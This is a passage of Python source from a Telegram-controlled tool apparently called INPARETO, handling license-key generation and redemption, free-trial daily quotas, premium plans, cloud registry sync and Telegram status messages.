        "display_name": (info.get("display_name") or "")[:64] or f"User {chat_id[-6:]}",
    }


def restore_operator_session_from_cloud(chat_id=None):
    """Re-link bot token from cloud when local files are missing or corrupt."""
    chat_id = str(chat_id or _read_stored_chat_id() or "").strip()
    if not chat_id or is_locally_logged_out():
        return False
    record = operator_link_get(chat_id)
    if not record:
        return False
    clear_local_logged_out()
    apply_telegram_credentials(record["telegram_bot_token"], record["telegram_chat_id"])
    restore_operator_hit_group_for_user(chat_id)
    return True


def license_parse_duration_days(token):
    raw = (token or "").strip().lower()
    if not raw:
        return 30
    if raw.endswith("h"):
        hours = max(1, int(raw[:-1]))
        return max(1, round(hours / 24))
    if raw.endswith("d"):
        return max(1, min(LICENSE_MAX_DAYS, int(raw[:-1])))
    if raw.endswith("m") and not raw.endswith("min"):
        months = max(1, int(raw[:-1]))
        return max(1, min(LICENSE_MAX_DAYS, months * 30))
    if raw.isdigit():
        return max(1, min(LICENSE_MAX_DAYS, int(raw)))
    return 30


def license_normalize_key(key):
    key = (key or "").strip().upper().replace(" ", "")
    key = key.replace("_", "-")
    if not key.startswith(LICENSE_KEY_PREFIX):
        if len(key.replace("-", "")) == 16:
            key = f"{LICENSE_KEY_PREFIX}-{key[0:4]}-{key[4:8]}-{key[8:12]}-{key[12:16]}"
    return key


def license_generate_key(days, by_admin=""):
    days = max(1, min(LICENSE_MAX_DAYS, int(days)))
    with _license_registry_lock:
        reg, err = license_fetch_registry(force=True)
        if err and "offline" in str(err).lower():
            return None, err
        token = secrets.token_hex(8).upper()
        key = f"{LICENSE_KEY_PREFIX}-{token[0:4]}-{token[4:8]}-{token[8:12]}-{token[12:16]}"
        reg.setdefault("keys", {})[key] = {
            "days": days,
            "created_at": license_iso_now(),
            "created_by": str(by_admin or ""),
            "redeemed_by": None,
            "redeemed_at": None,
        }
        save_err = license_save_registry(reg)
        if save_err:
            return None, save_err
    return key, None


def license_grant_user(user_id, days, *, by_admin="", source="manual", note="", key_ref=""):
    user_id = str(user_id).strip()
    if not user_id or not user_id.isdigit():
        return False, "Invalid Telegram user id"
    days = max(1, min(LICENSE_MAX_DAYS, int(days)))
    with _license_registry_lock:
        reg, err = license_fetch_registry(force=True)
        if err and "offline" in str(err).lower():
            return False, err
        now = datetime.now(timezone.utc)
        lic = reg.setdefault("licenses", {}).get(user_id) or {}
        base = now
        existing_exp = license_parse_iso(lic.get("expires_at"))
        if existing_exp and existing_exp > now:
            base = existing_exp
        new_exp = base + timedelta(days=days)
        reg["licenses"][user_id] = {
            "expires_at": new_exp.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "granted_at": license_iso_now(),
            "granted_by": str(by_admin or ""),
            "source": source,
            "note": (note or "")[:120],
            "key_ref": key_ref or "",
        }
        save_err = license_save_registry(reg)
        if save_err:
            return False, save_err
    persist_local_license(user_id, reg["licenses"][user_id]["expires_at"])
    license_invalidate_cache()
    admin_invalidate_access(user_id)
    invalidate_operator_gate_cache()
    return True, new_exp


def license_revoke_user(user_id):
    user_id = str(user_id).strip()
    with _license_registry_lock:
        reg, _ = license_fetch_registry(force=True)
        reg.setdefault("licenses", {}).pop(user_id, None)
        save_err = license_save_registry(reg)
    if user_id == resolve_operator_telegram_id():
        clear_local_license()
    license_invalidate_cache()
    admin_invalidate_access(user_id)
    invalidate_operator_gate_cache()
    return save_err


def license_redeem_key(key, user_id):
    """Atomic redeem — grant + mark key in one cloud save (never wipe licenses)."""
    user_id = str(user_id).strip()
    key = license_normalize_key(key)
    with _license_registry_lock:
        reg, err = license_fetch_registry(force=True)
        if err and "offline" in str(err).lower():
            return False, "Cloud offline — try again"
        entry = reg.get("keys", {}).get(key)
        if not entry:
            return False, "Invalid or expired key"
        if entry.get("redeemed_by"):
            return False, "Key already redeemed"
        days = int(entry.get("days") or 30)
        now = datetime.now(timezone.utc)
        lic = reg.setdefault("licenses", {}).get(user_id)
        base = now
        if isinstance(lic, dict):
            existing_exp = license_parse_iso(lic.get("expires_at"))
            if existing_exp and existing_exp > now:
                base = existing_exp
        new_exp = base + timedelta(days=days)
        reg["licenses"][user_id] = {
            "expires_at": new_exp.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "granted_at": license_iso_now(),
            "granted_by": str(entry.get("created_by") or ""),
            "source": "key",
            "note": "",
            "key_ref": key,
        }
        entry = dict(entry)
        entry["redeemed_by"] = user_id
        entry["redeemed_at"] = license_iso_now()
        reg.setdefault("keys", {})[key] = entry
        save_err = license_save_registry(reg)
        if save_err:
            return False, save_err
    persist_local_license(user_id, reg["licenses"][user_id]["expires_at"])
    license_invalidate_cache()
    admin_invalidate_access(user_id)
    invalidate_operator_gate_cache()
    return True, new_exp


def refresh_terminal_license_from_cloud():
    """Pull cloud license into .inpareto_license for this operator (Enter refresh)."""
    user_id = resolve_operator_telegram_id()
    if not user_id:
        return
    admin_load_settings(force=False)
    license_invalidate_cache()
    paid_ok, _, exp = paid_access_status(user_id)
    if paid_ok and exp:
        persist_local_license(user_id, exp.strftime("%Y-%m-%dT%H:%M:%SZ"))


def ensure_boot_access_context():
    """Sync admin list, license, hit group from cloud (Telegram id only)."""
    if not TELEGRAM_ENABLED or not is_cloud_enabled():
        return
    if is_locally_logged_out() or not has_local_operator_session():
        return
    try:
        admin_load_settings(force=True)
        refresh_terminal_license_from_cloud()
        uid = resolve_operator_telegram_id()
        if uid and not plan_is_premium(uid):
            operator_plan_entitled(uid)
        sync_local_hit_group_from_cloud()
        reconcile_operator_hit_group()
    except Exception as exc:
        log_event("BOOT CTX", str(exc)[:80])


def _spawn_boot_access_refresh():
    """Pull cloud license/settings without blocking the boot menu."""
    if not TELEGRAM_ENABLED or not is_cloud_enabled():
        return
    if is_locally_logged_out() or not has_local_operator_session():
        return

    def _run():
        try:
            ensure_boot_access_context()
        except Exception as exc:
            log_event("BOOT CTX", str(exc)[:80])

    threading.Thread(target=_run, daemon=True, name="boot-ctx").start()


def _load_local_session_record():
    """Build a device-like dict from local hidden files (primary login source)."""
    chat_id = _read_stored_chat_id()
    token = _read_stored_bot_token()
    if not chat_id or not token:
        return None
    return {
        "telegram_chat_id": chat_id,
        "telegram_bot_token": token,
        "display_name": f"User {chat_id[-6:]}",
    }


def _boot_linked_from_local():
    """Start Telegram from local .inpareto_* files, or cloud operator_links backup."""
    record = _load_local_session_record()
    if not record:
        chat_id = _read_stored_chat_id()
        if chat_id and restore_operator_session_from_cloud(chat_id):
            record = _load_local_session_record()
    if not record:
        return False
    apply_telegram_credentials(record["telegram_bot_token"], record["telegram_chat_id"])
    local_gid = read_local_hit_group_id()
    if local_gid:
        global _cached_hit_group_id
        _cached_hit_group_id = local_gid
    for line in paint_action_box(
        "BOOT",
        [
            ("Session restored — bot is live (local or cloud backup).", ANSI_GREEN),
            ("Finish plan setup / hit group on the next screen if needed.", ANSI_DIM),
        ],
        ANSI_CYAN,
    ):
        print(line)
    print()
    sys.stdout.flush()
    start_telegram_monitor()
    threading.Thread(
        target=_defer_linked_device_sync,
        args=(record,),
        daemon=True,
        name="boot-device-sync",
    ).start()
    return True


def paid_access_status(user_id):
    """(ok, reason, expires_dt) — keyed by Telegram user id."""
    user_id = str(user_id or "").strip()
    if not user_id:
        return False, "no_license", None
    if admin_is_admin(user_id):
        return True, None, None
    now = datetime.now(timezone.utc)
    local = read_local_license()
    if local and str(local.get("user_id")) == user_id:
        exp = license_parse_iso(local.get("expires_at"))
        if exp and exp > now:
            return True, None, exp
    if not is_cloud_enabled():
        if local and str(local.get("user_id")) == user_id:
            exp = license_parse_iso(local.get("expires_at"))
            if exp and exp > now:
                return True, None, exp
        with _paid_access_lock:
            reg = _paid_access_cache.get("registry")
            reg_at = float(_paid_access_cache.get("at") or 0)
        if (
            isinstance(reg, dict)
            and time.time() - reg_at < PLAN_CLOUD_OFFLINE_GRACE_SEC
        ):
            row = (reg.get("licenses") or {}).get(user_id)
            if isinstance(row, dict):
                exp = license_parse_iso(row.get("expires_at"))
                if exp and exp > now:
                    return True, None, exp
        return False, "cloud_offline", None
    reg, err = license_fetch_registry()
    if err:
        if local and str(local.get("user_id")) == user_id:
            exp = license_parse_iso(local.get("expires_at"))
            if exp and exp > now:
                return True, None, exp
        with _paid_access_lock:
            reg = _paid_access_cache.get("registry")
            reg_at = float(_paid_access_cache.get("at") or 0)
        if (
            isinstance(reg, dict)
            and time.time() - reg_at < PLAN_CLOUD_OFFLINE_GRACE_SEC
        ):
            row = (reg.get("licenses") or {}).get(user_id)
            if isinstance(row, dict):
                exp = license_parse_iso(row.get("expires_at"))
            if exp and exp > now:
                return True, None, exp
        return False, "cloud_offline", None
    row = reg.get("licenses", {}).get(user_id)
    if not row:
        return False, "no_license", None
    exp = license_parse_iso(row.get("expires_at"))
    if not exp or exp <= now:
        with _paid_access_lock:
            fresh = time.time() - float(_paid_access_cache.get("at") or 0) < LICENSE_CACHE_TTL
        if fresh and user_id == resolve_operator_telegram_id():
            clear_local_license()
        return False, "expired", exp
    if user_id == resolve_operator_telegram_id():
        persist_local_license(user_id, row.get("expires_at"))
    return True, None, exp


def plan_utc_day():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d")


def plan_fetch_enforcement_registry():
    """Cloud registry for quota enforcement — stale cache allowed briefly when offline."""
    if not is_cloud_enabled():
        return False, None, "Cloud offline"
    reg, err = license_fetch_registry(force=False)
    if not err:
        return True, reg, None
    now = time.time()
    with _paid_access_lock:
        cached = _paid_access_cache.get("registry")
        cached_at = float(_paid_access_cache.get("at") or 0)
        if (
            cached is not None
            and now - cached_at < PLAN_CLOUD_OFFLINE_GRACE_SEC
        ):
            return True, json.loads(json.dumps(cached)), "cache"
    return False, None, err or "Cloud offline"


def plan_is_premium(user_id):
    user_id = str(user_id or "").strip()
    if not user_id:
        return False
    if admin_is_admin(user_id):
        return True
    ok, _, _ = paid_access_status(user_id)
    return bool(ok)


def plan_merge_free_row(cloud_row, local_row, *, online=False):
    """Cloud is source of truth when online — local file is encrypted cache only."""
    if online and isinstance(cloud_row, dict) and cloud_row.get("trial_ends_at"):
        return dict(cloud_row)
    if isinstance(cloud_row, dict):
        row = dict(cloud_row)
    elif isinstance(local_row, dict):
        row = {k: v for k, v in local_row.items() if k != "user_id"}
    else:
        return {}
    if (
        not online
        and isinstance(cloud_row, dict)
        and isinstance(local_row, dict)
    ):
        today = plan_utc_day()
        cloud_day = str(cloud_row.get("last_day") or "")
        local_day = str(local_row.get("last_day") or "")
        if cloud_day == today and local_day == today:
            row["day_count"] = max(
                int(cloud_row.get("day_count") or 0),
                int(local_row.get("day_count") or 0),
            )
            row["last_day"] = today
    return row


def plan_fetch_free_row(user_id, registry=None, *, online=None):
    user_id = str(user_id or "").strip()
    local_row = read_local_free_plan()
    if local_row and str(local_row.get("user_id")) != user_id:
        local_row = None
    cloud_row = None
    if isinstance(registry, dict):
        cloud_row = (registry.get("free") or {}).get(user_id)
    if online is None:
        online = is_cloud_enabled() and isinstance(registry, dict)
    return plan_merge_free_row(cloud_row, local_row, online=online)


def plan_free_trial_expired(row):
    trial_end = license_parse_iso((row or {}).get("trial_ends_at"))
    if not trial_end:
        return False
    return trial_end <= datetime.now(timezone.utc)


def plan_new_free_row():
    now = datetime.now(timezone.utc)
    trial_end = now + timedelta(days=FREE_TRIAL_DAYS)
    return {
        "started_at": license_iso_now(),
        "trial_ends_at": trial_end.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "last_day": plan_utc_day(),
        "day_count": 0,
    }


def plan_save_free_row(user_id, row, registry=None):
    user_id = str(user_id or "").strip()
    if not user_id or not isinstance(row, dict):
        return "invalid free plan row"
    persist_local_free_plan(user_id, row)
    if not is_cloud_enabled():
        return None
    with _license_registry_lock:
        reg = registry
        if reg is None:
            reg, err = license_fetch_registry(force=True)
            if err and "offline" not in str(err).lower():
                return err
            if err:
                return None
        reg.setdefault("free", {})[user_id] = dict(row)
        return license_save_registry(reg)


def plan_ensure_free_trial(user_id, registry=None, *, persist=True, online=False):
    user_id = str(user_id or "").strip()
    if not user_id or plan_is_premium(user_id):
        return plan_fetch_free_row(user_id, registry, online=online), None, False
    row = plan_fetch_free_row(user_id, registry, online=online)
    created = False
    if row.get("trial_ends_at") and plan_free_trial_expired(row):
        return row, None, False
    if not isinstance(row, dict) or not row.get("trial_ends_at"):
        if not persist or registry is None:
            return row or {}, None, False
        row = plan_new_free_row()
        created = True
        save_err = plan_save_free_row(user_id, row, registry)
        if save_err:
            return row, save_err, created
    elif persist and registry is not None:
        cloud_row = (registry.get("free") or {}).get(user_id)
        if not cloud_row:
            save_err = plan_save_free_row(user_id, row, registry)
            if save_err:
                return row, save_err, created
    return row, None, created


def plan_free_day_count(row):
    row = row if isinstance(row, dict) else {}
    today = plan_utc_day()
    if str(row.get("last_day") or "") != today:
        return 0, today
    return int(row.get("day_count") or 0), today


def plan_build_snapshot(user_id, row=None, *, registry=None):
    user_id = str(user_id or "").strip()
    now = datetime.now(timezone.utc)
    if plan_is_premium(user_id):
        ok, reason, exp = paid_access_status(user_id)
        remaining = max(0, int(((exp - now).total_seconds() if exp else 0) // 86400))
        return {
            "plan": PLAN_PREMIUM,
            "tier": "admin" if admin_is_admin(user_id) else PLAN_PREMIUM,
            "active": bool(ok),
            "reason": reason,
            "expires_at": exp,
            "days_left": remaining,
            "limit": None,
            "day_count": None,
            "trial_ends_at": None,
            "trial_expired": False,
        }
    if row is None:
        reg_ok, reg, _ = plan_fetch_enforcement_registry()
        if reg_ok:
            row, _, _ = plan_ensure_free_trial(
                user_id, reg, persist=False, online=True,
            )
        else:
            row = plan_fetch_free_row(user_id, online=False)
    day_count, today = plan_free_day_count(row)
    trial_end = license_parse_iso((row or {}).get("trial_ends_at"))
    trial_active = bool(trial_end and trial_end > now)
    remaining_trial = max(0, int(((trial_end - now).total_seconds() if trial_end else 0) // 86400))
    if trial_end and trial_end <= now:
        remaining_trial = 0
    pct = min(100.0, 100.0 * day_count / max(1, FREE_DAILY_GEN_LIMIT))
    return {
        "plan": PLAN_FREE,
        "tier": PLAN_FREE,
        "active": trial_active,
        "reason": None if trial_active else "trial_expired",
        "expires_at": trial_end,
        "days_left": remaining_trial,
        "limit": FREE_DAILY_GEN_LIMIT,
        "day_count": day_count,
        "last_day": today,
        "trial_ends_at": trial_end,
        "trial_expired": not trial_active,
        "usage_pct": pct,
        "remaining_today": max(0, FREE_DAILY_GEN_LIMIT - day_count),
    }


def operator_plan_entitled(user_id):
    """Bot/terminal access — active free trial or premium (daily cap does not block)."""
    user_id = str(user_id or "").strip()
    if not user_id:
        return False, "no_user", {}
    if admin_is_admin(user_id):
        return True, None, plan_build_snapshot(user_id)
    if plan_is_premium(user_id):
        snap = plan_build_snapshot(user_id)
        if snap.get("active"):
            return True, None, snap
        return False, snap.get("reason") or "expired", snap
    with _license_registry_lock:
        reg_ok, reg, src = plan_fetch_enforcement_registry()
        if not reg_ok:
            if read_operator_session_verified(user_id) and _dashboard_local_premium_snap(user_id):
                return True, None, _dashboard_local_premium_snap(user_id)
            if read_operator_session_verified(user_id):
                row = plan_fetch_free_row(user_id, online=False)
                if row and not plan_free_trial_expired(row):
                    return True, None, plan_build_snapshot(user_id, row)
            return False, "cloud_offline", {"plan": PLAN_FREE}
        online = src != "cache"
        row, save_err, _ = plan_ensure_free_trial(
            user_id, reg, persist=True, online=online,
        )
        if save_err and "offline" not in str(save_err).lower():
            log_event("PLAN", f"free tier sync: {str(save_err)[:60]}")
        snap = plan_build_snapshot(user_id, row, registry=reg)
        if snap.get("trial_expired"):
            return False, "trial_expired", snap
        if src == "cache":
            snap["local_fallback"] = True
        return True, None, snap


def plan_can_hunt(user_id=None):
    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
    if not user_id:
        return False, "no_user", {}
    entitled, reason, info = operator_plan_entitled(user_id)
    if not entitled:
        return False, reason or "no_access", info
    if info.get("plan") == PLAN_PREMIUM:
        return True, None, info
    day_count = int(info.get("day_count") or 0)
    limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
    if day_count >= limit:
        info = dict(info)
        info["remaining_today"] = 0
        return False, "daily_limit", info
    return True, None, info


def _plan_flush_acquire_cloud_cache():
    """Push batched free-plan increments to cloud (best-effort)."""
    cache = _plan_acquire_cache
    pending = int(cache.get("cloud_pending") or 0)
    reg = cache.get("reg")
    if pending <= 0 or not is_cloud_enabled() or not isinstance(reg, dict):
        cache["cloud_pending"] = 0
        return None
    err = license_save_registry(reg)
    cache["cloud_pending"] = 0
    return err


def plan_acquire_generation(user_id=None, count=1):
    """Atomically enforce quota and increment (cloud authoritative). Call before hunt HTTP."""
    global _plan_limit_warn_level, _plan_limit_warn_day, _plan_acquire_cache
    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
    count = max(1, int(count or 1))
    if not user_id:
        return False, "no_user", {}
    if plan_is_premium(user_id) or admin_is_admin(user_id):
        return True, None, plan_build_snapshot(user_id)
    today = plan_utc_day()
    if _plan_limit_warn_day != today:
        _plan_limit_warn_day = today
        _plan_limit_warn_level = 0
    with _license_registry_lock:
        cache = _plan_acquire_cache
        now = time.time()
        reload = (
            cache.get("user_id") != user_id
            or cache.get("row") is None
            or cache.get("reg") is None
            or now - float(cache.get("loaded_at") or 0) >= PLAN_REGISTRY_RELOAD_SEC
        )
        if reload:
            if cache.get("user_id") and int(cache.get("cloud_pending") or 0) > 0:
                _plan_flush_acquire_cloud_cache()
        reg_ok, reg, src = plan_fetch_enforcement_registry()
        row = None
        if reg_ok:
            online = src != "cache"
            row, save_err, _ = plan_ensure_free_trial(
                user_id, reg, persist=True, online=online,
            )
            if save_err and "offline" not in str(save_err).lower():
                return False, "cloud_offline", {"plan": PLAN_FREE}
        elif read_operator_session_verified(user_id):
            row = plan_fetch_free_row(user_id, online=False)
            if row and not plan_free_trial_expired(row):
                reg = {"free": {user_id: dict(row)}}
            else:
                row = None
        if not isinstance(reg, dict) or not row:
            return False, "cloud_offline", {"plan": PLAN_FREE}
        cache.update(
            user_id=user_id,
            row=dict(row),
            reg=reg,
            loaded_at=now,
            cloud_pending=int(cache.get("cloud_pending") or 0),
        )
        if plan_free_trial_expired(row):
            snap = plan_build_snapshot(user_id, row, registry=reg)
            return False, "trial_expired", snap
        day_count, _ = plan_free_day_count(row)
        limit = FREE_DAILY_GEN_LIMIT
        if day_count + count > limit:
            snap = plan_build_snapshot(user_id, row, registry=reg)
            snap["remaining_today"] = 0
            plan_handle_daily_limit_hit()
            return False, "daily_limit", snap
        row = dict(row)
        row["last_day"] = today
        row["day_count"] = day_count + count
        persist_local_free_plan(user_id, row)
        if isinstance(reg, dict):
            reg.setdefault("free", {})[user_id] = dict(row)
        cache["row"] = dict(row)
        cache["cloud_pending"] = int(cache.get("cloud_pending") or 0) + 1
        if reload or cache["cloud_pending"] >= PLAN_CLOUD_BATCH_EVERY:
            save_err = _plan_flush_acquire_cloud_cache()
        if save_err and "offline" not in str(save_err).lower():
                log_event("PLAN", f"cloud sync deferred: {str(save_err)[:60]}")
        used = int(row["day_count"])
        for idx, threshold in enumerate(FREE_PLAN_WARN_PCT):
            level = idx + 1
            if used / limit >= threshold and _plan_limit_warn_level < level:
                _plan_limit_warn_level = level
                log_event(
                    "PLAN",
                    f"Free quota {int(threshold * 100)}% — {used:,}/{limit:,} generated today",
                )
        snap = plan_build_snapshot(user_id, row, registry=reg)
        if used >= limit:
            _plan_flush_acquire_cloud_cache()
            plan_handle_daily_limit_hit()
        return True, None, snap


def plan_record_generated(user_id=None, count=1):
    """Deprecated path — quota is reserved in plan_acquire_generation before hunt."""
    return plan_acquire_generation(user_id, count)


def plan_release_generation(user_id=None, count=1):
    """Rollback optimistic quota when hunt aborts before a username is consumed."""
    global _plan_acquire_cache
    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
    count = max(1, int(count or 1))
    if not user_id or plan_is_premium(user_id) or admin_is_admin(user_id):
        return
    with _license_registry_lock:
        cache = _plan_acquire_cache
        if (
            cache.get("user_id") == user_id
            and isinstance(cache.get("row"), dict)
            and isinstance(cache.get("reg"), dict)
        ):
            reg = cache["reg"]
            row = dict(cache["row"])
        else:
            reg_ok, reg, src = plan_fetch_enforcement_registry()
            if not reg_ok:
                return
            row, _, _ = plan_ensure_free_trial(
                user_id, reg, persist=False, online=src != "cache",
            )
            row = dict(row) if isinstance(row, dict) else {}
        day_count, today = plan_free_day_count(row)
        if str(row.get("last_day") or "") != today or day_count <= 0:
            return
        row["day_count"] = max(0, day_count - count)
        persist_local_free_plan(user_id, row)
        if isinstance(reg, dict):
            reg.setdefault("free", {})[user_id] = dict(row)
        cache.update(user_id=user_id, row=dict(row), reg=reg)
        cache["cloud_pending"] = int(cache.get("cloud_pending") or 0) + 1


def _plan_send_limit_telegram():
    try:
        body = format_operator_plan_gate("daily_limit", plan_build_snapshot(resolve_operator_telegram_id()))
        bot_command_reply(body, force=True)
    except Exception as exc:
        log_event("PLAN", f"limit alert failed: {str(exc)[:60]}")


def plan_handle_daily_limit_hit():
    global _plan_limit_notify_signature
    uid = resolve_operator_telegram_id()
    sig = f"{uid}:{plan_utc_day()}"
    if _plan_limit_notify_signature == sig:
        apply_worker_pause_state()
        return
    _plan_limit_notify_signature = sig
    log_event(
        "PLAN",
        f"Daily limit reached ({FREE_DAILY_GEN_LIMIT:,}/day) — switch to INPARETO Premium",
    )
    apply_worker_pause_state()
    if TELEGRAM_ENABLED and TELEGRAM_CHAT_ID:
        threading.Thread(target=_plan_send_limit_telegram, daemon=True).start()


def plan_usage_bar(used, limit, width=10):
    limit = max(1, int(limit or 1))
    used = max(0, int(used or 0))
    filled = min(width, int(width * used / limit))
    bar = "▰" * filled + "▱" * (width - filled)
    pct = min(100, int(100 * used / limit))
    return bar, pct


def format_operator_plan_gate(reason="no_license", info=None, expires_at=None):
    info = info if isinstance(info, dict) else {}
    uid = resolve_operator_telegram_id() or "—"
    lines = [
        format_panel_header(),
        f"<b>{S['brand']} Plan Required</b>\n\n",
    ]
    if reason == "daily_limit":
        used = int(info.get("day_count") or FREE_DAILY_GEN_LIMIT)
        limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
        bar, pct = plan_usage_bar(used, limit, 12)
        lines.append(
            "<b>Daily limit reached</b>\n"
            f"You generated <code>{used:,}</code> / <code>{limit:,}</code> today "
            f"({pct}%).\n"
            f"<code>{bar}</code>\n\n"
            "<b>Switch to INPARETO Premium</b> to continue hunting with "
            "unlimited generation.\n\n"
        )
    elif reason == "trial_expired":
        lines.append(
            "<b>Free trial ended</b>\n"
            f"Your {FREE_TRIAL_DAYS}-day INPARETO Free trial has expired.\n"
            "<b>Redeem a license key</b> to unlock Premium and continue.\n\n"
        )
    elif reason == "expired":
        lines.append(
            f"<b>Premium license expired</b> "
            f"({license_format_expiry(expires_at or info.get('expires_at'))}).\n"
            "Renew with a new key or contact admin.\n\n"
        )
    elif reason == "cloud_offline":
        lines.append(
            "<b>Cannot verify plan</b> (cloud offline).\n"
            "Check internet and try <code>/plan</code> or <code>/mylicense</code>.\n\n"
        )
    else:
        lines.append(
            "<b>No active plan</b> on this Telegram account.\n"
            f"New users get <b>{FREE_TRIAL_DAYS} days free</b> "
            f"({FREE_DAILY_GEN_LIMIT:,} generated/day).\n\n"
        )
    lines.append(
        f"  {S['bullet']} <code>/redeem INPA-XXXX-XXXX-XXXX-XXXX</code>  {S['dash']} Premium\n"
        f"  {S['bullet']} <code>/plan</code>  {S['dash']} Usage & trial status\n"
        f"  {S['bullet']} <code>/mylicense</code>  {S['dash']} License details\n"
        f"  {S['bullet']} Your ID: <code>{html.escape(uid)}</code>\n\n"
        f"<i>Support: {admin_channel_tag()}</i>"
    )
    return "".join(lines)


def format_plan_message(user_id):
    user_id = str(user_id or "").strip()
    entitled, reason, info = operator_plan_entitled(user_id)
    snap = info if isinstance(info, dict) else plan_build_snapshot(user_id)
    if admin_is_admin(user_id):
        return (
            format_panel_header()
            + "<b>INPARETO Plan</b>\n\n"
            + tg_row("Tier", "Admin · unlimited")
            + tg_row("Hunt", "Unrestricted")
            + "\n<i>Full platform access — no quotas.</i>"
        )
    if snap.get("plan") == PLAN_PREMIUM:
        exp = snap.get("expires_at")
        days_left = snap.get("days_left", 0)
        status = "Active" if snap.get("active") else "Expired"
        return (
            format_panel_header()
            + "<b>INPARETO Premium</b>\n\n"
            + tg_row("Status", status)
            + tg_row("Telegram ID", str(user_id))
            + tg_row("Expires", license_format_expiry(exp))
            + tg_row("Remaining", f"~{days_left} day(s)")
            + "\n<i>Unlimited generation · no daily cap · full hunt access.</i>"
        )
    used = int(snap.get("day_count") or 0)
    limit = int(snap.get("limit") or FREE_DAILY_GEN_LIMIT)
    remaining = int(snap.get("remaining_today") or max(0, limit - used))
    bar, pct = plan_usage_bar(used, limit, 14)
    trial_end = snap.get("trial_ends_at")
    trial_days = snap.get("days_left", 0)
    trial_lbl = license_format_expiry(trial_end) if trial_end else "—"
    if snap.get("trial_expired"):
        headline = "Trial expired"
        foot = "Redeem Premium to continue hunting."
    elif reason == "daily_limit" or used >= limit:
        headline = "Daily limit reached"
        foot = "Switch to INPARETO Premium to continue."
    else:
        headline = "INPARETO Free"
        foot = f"{FREE_TRIAL_DAYS}-day trial · {FREE_DAILY_GEN_LIMIT:,} generated/day."
    return (
        format_panel_header()
        + f"<b>{headline}</b>\n\n"
        + tg_row("Telegram ID", str(user_id))
        + tg_row("Trial ends", trial_lbl)
        + tg_row("Trial left", f"~{trial_days} day(s)")
        + tg_row("Today", f"{used:,} / {limit:,} ({pct}%)")
        + tg_row("Remaining", f"{remaining:,} today")
        + f"\n<code>{bar}</code>\n\n"
        + f"<i>{foot}</i>\n"
        + f"<i>Upgrade: <code>/redeem INPA-…</code></i>"
    )


def format_paid_license_gate(reason="no_license", expires_at=None):
    if reason in ("daily_limit", "trial_expired"):
        snap = plan_build_snapshot(resolve_operator_telegram_id() or "")
        return format_operator_plan_gate(reason, snap, expires_at)
    if reason == "no_license":
        entitled, preason, info = operator_plan_entitled(resolve_operator_telegram_id() or "")
        if entitled:
            snap = info if isinstance(info, dict) else plan_build_snapshot(resolve_operator_telegram_id() or "")
            if snap.get("plan") == PLAN_FREE:
                return format_plan_message(resolve_operator_telegram_id())
        if preason in ("trial_expired", "daily_limit"):
            return format_operator_plan_gate(preason, info, expires_at)
    lines = [
        format_panel_header(),
        f"<b>{S['brand']} Access</b>\n\n",
        "<i>INPARETO Free trial or Premium license required.</i>\n\n",
    ]
    if reason == "expired":
        lines.append(
            f"<b>Premium license expired</b> "
            f"({license_format_expiry(expires_at)}).\n"
            "Renew with a new key or contact admin.\n\n"
        )
    elif reason == "cloud_offline":
        lines.append(
            "<b>Cannot verify plan</b> (cloud offline).\n"
            "Check internet and try <code>/plan</code> again.\n\n"
        )
    else:
        lines.append(
            f"<b>Start with INPARETO Free</b> — {FREE_TRIAL_DAYS}-day trial, "
            f"{FREE_DAILY_GEN_LIMIT:,} generated/day.\n"
            "Redeem a key anytime for unlimited Premium.\n\n"
        )
    lines.append(
        f"  {S['bullet']} <code>/redeem INPA-XXXX-XXXX-XXXX-XXXX</code>\n"
        f"  {S['bullet']} <code>/plan</code>  {S['dash']} Trial & daily usage\n"
        f"  {S['bullet']} <code>/mylicense</code>  {S['dash']} License status\n"
        f"  {S['bullet']} Your ID: <code>{html.escape(resolve_operator_telegram_id() or '—')}</code>\n\n"
        f"<i>Support: {admin_channel_tag()}</i>"
    )
    return "".join(lines)


def format_my_license_message(user_id):
    user_id = str(user_id or "").strip()
    if admin_is_admin(user_id):
        return (
            format_panel_header()
            + "<b>License</b>\n\n"
            + "<b>Admin</b> — unlimited Premium access.\n"
        )
    if plan_is_premium(user_id):
        ok, reason, exp = paid_access_status(user_id)
        if ok:
            remaining = (exp - datetime.now(timezone.utc)).total_seconds() if exp else 0
            days_left = max(0, int(remaining // 86400))
            return (
                format_panel_header()
                + "<b>INPARETO Premium</b>\n\n"
                + tg_row("Plan", "Premium · unlimited")
                + tg_row("Telegram ID", str(user_id))
                + tg_row("Expires", license_format_expiry(exp))
                + tg_row("Remaining", f"~{days_left} day(s)")
                + "\n<i>Hunt and remote control stay on until expiry.</i>"
            )
        return format_operator_plan_gate(reason or "expired", plan_build_snapshot(user_id), exp)
    entitled, reason, info = operator_plan_entitled(user_id)
    if entitled and info.get("plan") == PLAN_FREE:
        return format_plan_message(user_id)
    return format_operator_plan_gate(reason or "trial_expired", info)


def admin_resolve_force_join_chat_ref(row):
    """Turn DB row into a chat_id getChatMember accepts (@user, -100…, or invite)."""
    raw_cid = (row.get("chat_id") or "").strip()
    raw_inv = (row.get("invite_link") or "").strip()
    combined = raw_inv or raw_cid
    preview = (row.get("preview_name") or "").lower()

    if "channel" in preview and _admin_settings.get("channel_username"):
        return f"@{_admin_settings['channel_username'].lstrip('@')}"

    if combined and "://" in combined and "t.me" not in combined.lower():
        host = combined.split("://", 1)[-1].split("/")[0].strip()
        if host and not re.fullmatch(r"-?\d+", host):
            combined = f"https://t.me/{host.lstrip('@')}"

    parsed_cid, parsed_inv = admin_parse_chat_target(combined)
    ref = (parsed_cid or parsed_inv or combined or "").strip()
    if not ref:
        return ""

    if ref.startswith("https://t.me/+") or "/joinchat/" in ref or "/+" in ref:
        resolved = admin_resolve_chat_id_via_getchat(ref)
        if resolved:
            return resolved

    if ref.startswith("@"):
        return ref
    if re.fullmatch(r"-?\d+", ref):
        return ref
    if "t.me/" in ref:
        again_cid, _ = admin_parse_chat_target(ref)
        return again_cid or ref
    return f"@{ref.lstrip('@')}"


def admin_resolve_chat_id_via_getchat(chat_ref):
    """Resolve invite/@ link to numeric id when admin/operator bot is in the chat."""
    chat_ref = (chat_ref or "").strip()
    if not chat_ref:
        return None
    for api in _telegram_lookup_api_urls():
        try:
